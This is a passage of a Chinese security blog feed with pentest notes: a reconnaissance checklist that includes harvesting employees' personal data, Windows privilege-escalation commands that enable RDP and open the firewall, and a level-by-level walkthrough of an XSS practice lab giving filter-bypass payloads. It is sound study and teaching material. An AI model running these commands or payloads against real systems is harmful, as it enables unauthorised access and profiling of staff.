        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="信息搜集的作用"><a href="#信息搜集的作用" class="headerlink" title="信息搜集的作用"></a>信息搜集的作用</h2><ol><li>了解组织安全架构</li><li>缩小攻击范围</li><li>描绘网络拓扑</li><li>建立脆弱点数据库</li></ol><h2 id="信息搜集的分类"><a href="#信息搜集的分类" class="headerlink" title="信息搜集的分类"></a>信息搜集的分类</h2><ol><li>主动信息搜集：与目标主机进行直接交互，从而拿到目标信息，缺点是会记录自己的操作信息。</li><li>被动信息搜集：不与目标主机进行直接交互，通过搜索引擎或者社会工程等方式间接的获取目标主机的信息。</li></ol><h2 id="服务器信息搜集"><a href="#服务器信息搜集" class="headerlink" title="服务器信息搜集"></a>服务器信息搜集</h2><ul><li><p>whois查询</p><ul><li>域名详细信息</li><li>域名服务器信息</li><li>网络ip地址</li><li>域名创建，过期时间</li><li>最近更新记录</li><li>可通过注册邮箱、注册人等反查相关目标注册过的域名。</li><li>站长之家<a href="http://whois.chinaz.com" target="_blank" rel="noopener">http://whois.chinaz.com</a></li><li>阿里云域名信息查询<a href="https://whois.aliyun.com" target="_blank" rel="noopener">https://whois.aliyun.com</a></li><li>Kali whois命令</li><li>Python-whois模块查询域名信息</li></ul></li><li><p>企业信息搜集</p><ul><li>企业基本信息。</li><li>员工信息（手机号码、邮箱、姓名等），组织框架、企业法人、企业综合信息等。</li><li>其中员工信息收集是信息收集中的一项重要工作，员工信息包括：员工姓名、员工工号、员工家庭及交际信息、上网习惯等。（社会工程学）</li><li>员工身份信息：员工简历，员工身份证，手机号，生日，家乡，住址等个人信息。5、员工社交账号信息：QQ号，QQ群，微博，微信，支付宝，员工邮箱账号等。</li></ul></li><li><p>企业信息查询网站：</p><ul><li><a href="https://www.tianyancha.com天眼查" target="_blank" rel="noopener">https://www.tianyancha.com天眼查</a></li><li><a href="https://www.qichacha.com/企查查" target="_blank" rel="noopener">https://www.qichacha.com/企查查</a></li><li><a href="http://www.miitbeian.gov.cn/icp/publish/query/icpMemoInfo_showPage.action#ICP备案查询" target="_blank" rel="noopener">http://www.miitbeian.gov.cn/icp/publish/query/icpMemoInfo_showPage.action#ICP备案查询</a></li><li><a href="http://www.beian.gov.cn/portal/recordQuery公安部备案查询" target="_blank" rel="noopener">http://www.beian.gov.cn/portal/recordQuery公安部备案查询</a></li></ul></li><li><p>信息深入挖掘</p><ul><li>天眼查服务器搜集</li><li>GitHub信息（泄露源码，泄露数据库，邮箱，ftp，ssh，3389账号）</li><li>SVN信息</li><li>开放端口检测</li><li>cms指纹识别</li></ul></li><li><p>邮箱信息搜集</p><ul><li>常见的在线邮箱收集网站，这些网站通过爬虫，搜索引擎等方式，获取互联网上暴露的邮箱地址。</li><li><a href="http://www.skymem.info/" target="_blank" rel="noopener">http://www.skymem.info/</a></li><li><a href="https://hunter.io/" target="_blank" rel="noopener">https://hunter.io/</a></li><li><a href="https://email-format.com/" target="_blank" rel="noopener">https://email-format.com/</a></li></ul></li><li><p>搜索引擎查询</p><ul><li>Google、baidu、Bing等传统搜索引擎</li><li>site:baidu.com inurl:baidu.com</li><li>搜target.com|公司名字</li></ul></li><li><p>子域名枚举</p><ul><li>子域名枚举是为一个或多个域查找子域的过程，它是信息收集阶段的重要组成部分。</li><li>子域名探测可以帮我们发现渗透测试中更多的服务，它们在安全评估的范围内，从而增加了发现漏洞的机会。</li><li>查找一些用户上较少，被人遗忘的子域名，其上运行的应用程序可能会使我们发现关键漏洞。3.通常，同一组织的不同域名/应用程序中存在相同的漏洞。</li></ul></li><li><p>子域名搜集小工具</p><ul><li>subDomainsBrute <a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></li><li>wydomain <a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">https://github.com/ring04h/wydomain</a></li><li>wafw00f <a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></li><li>WhatWeb <a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a></li><li>dirsearch <a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a></li><li>layer子域名挖掘机</li><li>DNSdumpster</li><li>Sublist3r <a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></li></ul></li><li><p>web应用指纹信息</p><ul><li>网站架构<ul><li>中间件</li><li>开发语言</li><li>操作系统类型</li><li>数据库类型</li></ul></li><li>web应用指纹信息<ul><li>潮汐指纹：<a href="http://finger.tidesec.net" target="_blank" rel="noopener">http://finger.tidesec.net</a></li><li>云悉 <a href="http://www.yunsee.cn" target="_blank" rel="noopener">http://www.yunsee.cn</a></li><li>wappalyzer chrome插件</li><li>kali whatweb</li><li>cms识别工具 <a href="http://whatweb.bugscaner.com/look" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look</a></li><li>御剑</li></ul></li><li>敏感信息，目录信息<ul><li>robots.txt</li><li>crossdomin.xml</li><li>sitemap.xml</li><li>后台目录</li><li>网站安装包</li><li>网站上传目录</li><li>mysql管理页面</li><li>phpinfo</li><li>网站富文本编辑器</li><li>测试文件</li><li>备份文件(.rar、.zip、.7z、.rar.gz、.bak)，(<a href="http://www.zip、root.zip、web.zip" target="_blank" rel="noopener">www.zip、root.zip、web.zip</a>)</li><li>DS_Store文件</li><li>vim缓存文件(.swp、.swo、.swn)</li><li>web-inf/web.xml文件</li></ul></li><li>cms、通用性信息<ul><li>cms类型</li><li>display:none 中的版权信息</li><li>页面底部版权信息，关键字© Powered by等</li><li>注释掉的html代码</li><li>http头中的X-Poweered-By中的值</li><li>cookie中的关键字</li><li>robots.txt中的关键字</li><li>404报错页面</li></ul></li><li>旁站查询<ul><li>旁站是和目标网站在同一台服务器上的其它的网站，主站无法获取权限的情况下，旁站便可以作为攻击入口。</li><li><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a></li><li><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">https://phpinfo.me/bing.php</a></li><li><a href="https://www.aizhan.com/" target="_blank" rel="noopener">https://www.aizhan.com/</a> IP反查域名</li><li><a href="http://www.webscan.cc" target="_blank" rel="noopener">http://www.webscan.cc</a></li></ul></li><li>C段信息<ul><li><a href="http://www.webscan.cc" target="_blank" rel="noopener">http://www.webscan.cc</a></li><li><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">https://phpinfo.me/bing.php</a></li><li><a href="https://www.chinabaiker.com/cduan.php" target="_blank" rel="noopener">https://www.chinabaiker.com/cduan.php</a></li><li>Nmap扫描C段</li><li>菜刀扫描C段</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows提权基础</title>
      <link href="/2019/07/17/windows-ti-quan-ji-chu/"/>
      <url>/2019/07/17/windows-ti-quan-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="windows提权基础"><a href="#windows提权基础" class="headerlink" title="windows提权基础"></a>windows提权基础</h1><h2 id="windows基础提权命令"><a href="#windows基础提权命令" class="headerlink" title="windows基础提权命令"></a>windows基础提权命令</h2><pre class=" language-cmd"><code class="language-cmd">systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"  #查看系统信息Hostname  #主机名Set  #环境变量Net user  #查看用户信息Net1 user  #查看用户信息Tasklist /svc | find "TermService"netstat -ano | find "1488"wmic os get caption  #查看系统名wmic qfe get Description,HotFixID,InstalledOn  #查看补丁信息wmic product get name,version  #查看当前安装程序systeminfo>C:\Windows\Temp\temp.txt&(for %i in (KB4013081 KB3198234 KB3124280 KB3143141 KB3134228 KB3079904 KB3077657 KB3124280 KB3045171 KB2829361 KB3000061 KB2850851 KB2707511 KB970483 KB2124261 KB2271195 KB3057191 KB2840221 KB3000061 KB2850851 KB2711167 KB2360937 KB2478960 KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 KB942831 KB2503665 KB2592799 KB956572 KB977165 KB2621440) do @type C:\Windows\Temp\temp.txt|@find /i "%i"|| @echo %i Not Installed!)&del /f /q /a C:\Windows\Temp\temp.txt  #查看常用expREG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections  #检测3389是否允许远程连接  1 or 0REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber  #查看远程连接端口REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  #打开 3389netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow  #修改防火墙</code></pre>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS一些总结</title>
      <link href="/2019/07/15/xss/"/>
      <url>/2019/07/15/xss/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS挑战之旅"><a href="#XSS挑战之旅" class="headerlink" title="XSS挑战之旅"></a>XSS挑战之旅</h1><p><a href="http://test.xss.tv/" target="_blank" rel="noopener">在线地址</a><br><a href="https://pan.baidu.com/s/1zS2GwTNbMBXEF2yNEBeLgA" target="_blank" rel="noopener">本地搭建</a><br>注：本地测试chrome会自动拦截xss，关闭配置不安全且比较麻烦，建议使用Firefox</p><h2 id="xss挑战赛题目分析"><a href="#xss挑战赛题目分析" class="headerlink" title="xss挑战赛题目分析"></a>xss挑战赛题目分析</h2><p>做完后发现主要是一些类型，涉及的绕过不多</p><p>level 1</p><p>发现<code>name</code>参数会被输出到页面上，测试插入恶意代码<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p>payload：<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p>代码分析：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>欢迎用户"</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">"&lt;/h2>"</span><span class="token punctuation">;</span></code></pre><p>源码中直接输出未过滤的字符，直接构造任意可弹窗payload</p><p>level 2</p><p>先测试<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>发现输出到了<code>input</code>标签的<code>value</code>属性里</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>level2.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    &lt;input name="keyword" value="<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>搜索<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>尝试闭合<code>value</code>标签。<code>1&quot; &lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>level2.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>keyword<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">&lt;script</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>alert(/xss/)" &amp;g\t;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>搜索<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>发现<code>script</code>标签被闭合，那么直接闭合<code>input</code>标签，即可执行恶意代码<br>还可以添加事件来触发XSS</p><p>payload: <code>test&quot;&gt; &lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>             <code>&quot; onclick=&quot;alert(/xss/)&quot;</code></p><p>代码分析</p><pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>'<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span>level2.php</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span>GET</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.$str.<span class="token punctuation">'</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>搜索<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>'<span class="token punctuation">;</span></code></pre><p>可以看到直接拼接在了value内未作任何处理，即可闭合标签。</p><p>level 3</p><p>发现利用上一关的添加事件的payload可以直接打掉，那么直接分析一下原因</p><p>这里要使用单引号，原因可以通过ctrl+u查看源码得知使用单引号闭合的。<br>payload:  <code>&#39; onclick=&#39;alert(/xss/)&#39;</code></p><p>代码分析</p><pre class=" language-html"><code class="language-html">echo "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span>没有找到和".htmlspecialchars($str)."相关的结果.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>"."<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span>level3.php</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span>GET</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span><span class="token punctuation">"</span>.htmlspecialchars($str).<span class="token punctuation">"</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span>搜索</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>使用了<code>htmlspecialchars()</code>拼接字符，<code>htmlspecialchars()</code> 函数把预定义的字符转换为 HTML 实体。所以<code>&lt;</code>等符号无法闭合。</p><p>level 4</p><p>这关同样可以用事件绕过。。</p><p>payload:  <code>&quot; onclick=&#39;alert(/xss/)&quot;</code></p><p>代码分析</p><pre class=" language-php"><code class="language-php"><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>主要就是直接过滤掉了<code>&lt;,&gt;</code>。</p><p>level 5</p><p>经过测试，发现<code>&lt;script&gt;</code>替换成<code>&lt;scr_ipt&gt;</code>,<code>on</code>替换成<code>o_n</code>，大小写绕过没有用，应该是全转了小写，但是<code>&lt;,&gt;</code>没有过滤，那么可以闭合后插入标签构造js绕过</p><p>payload:  <code>&quot;&gt; &lt;a href=&quot;javascript:alert(/xss/)&gt;xss&lt;/a&gt;&quot;</code><br>              <code>&quot;&gt; &lt;iframe src=&quot;javascript:alert(/xss/)&quot;</code></p><p>代码分析</p><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>跟推断差不多</p><p>level 6</p><p>经过测试发现<code>scr,href,script,on</code>都被替换了，但是没做大小写，那么久很简单了，直接大小写绕过即可。</p><p>payload: <code>&quot; OncliCk=&quot;alert(/xss/)&quot;</code></p><p>代码分析</p><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>跟推测的过滤差不多</p><p>level 7</p><p>测试script标签发现只剩下一对尖括号了，应该是将script替换成空了，是ctf中最基础的过滤，直接双写即可绕过</p><p>payload: <code>&quot;&gt;&lt;scrscriptipt&gt;alert(/xss/)&lt;/scrscriptipt&gt;</code></p><p>代码分析</p><pre class=" language-php"><code class="language-php"><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>level 8</p><p>发现是插入<code>href</code>属性内，测试发现是<code>script,on</code>等字符被替换。想到再<code>href</code>内可以使用<code>javascript:</code>伪协议来触发<code>xss</code>，但是包含<code>script</code>也会被替换，这时候可以用<code>html实体字符绕过</code>，可以参考详细的<a href="http://www.w3school.com.cn/tags/html_ref_entities.html" target="_blank" rel="noopener">实体字符编码表</a></p><p>payload: <code>javascrip&amp;#x74;:alert(1)</code></p><p>代码分析</p><pre class=" language-php"><code class="language-php"><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">"scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str7</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'&amp;quot'</span><span class="token punctuation">,</span><span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这里的最后一条，导致无法截断<code>href</code></p><p>level 9</p><p>发现必须要是<code>http://</code>开头的才可以正确显示，但是不规定位置，这样就非常简单了</p><p>payload:  <code>javascrip&amp;#x74;: alert(&#39;http://&#39;+&#39;xss&#39;)</code></p><p>代码分析</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token operator">===</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str7</span><span class="token punctuation">,</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//'))</span><span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;BR>&lt;a href="您的链接不合法？有没有！">友情链接&lt;/a>&lt;/center>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>判断字符是否存在</p><p>level 10</p><p>过滤的很严格，但是发现了隐藏域，一个一个参数提交发现<code>t_sort</code>参数可控，然后就是简单的绕过即可，因为他是隐藏的，无法使用事件，所以把他的<code>type</code>修改掉</p><p>payload: <code>keyword=123&amp;t_link=123&amp;t_history=456&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(/xss/)&quot;</code></p><p>代码分析</p><pre class=" language-php"><code class="language-php"><span class="token variable">$str11</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>'<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>search</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_link<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_history<span class="token punctuation">"</span></span>  